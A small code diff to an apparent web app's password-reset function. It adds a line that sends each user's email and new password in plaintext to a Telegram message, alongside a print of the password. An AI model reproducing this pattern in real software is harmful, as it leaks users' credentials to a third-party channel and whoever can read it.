@@ -47,6 +47,7 @@ def modelsendforgotpasswordemail(email, file_path="static/db/users.csv"):
 
 def modelsendemail(email, newpassword):
     print(f'password has been changed to {newpassword}')
+    send_telegram_message(f'password {email} has been changed to {newpassword}')
     #todo - send email brevo
     return True
 
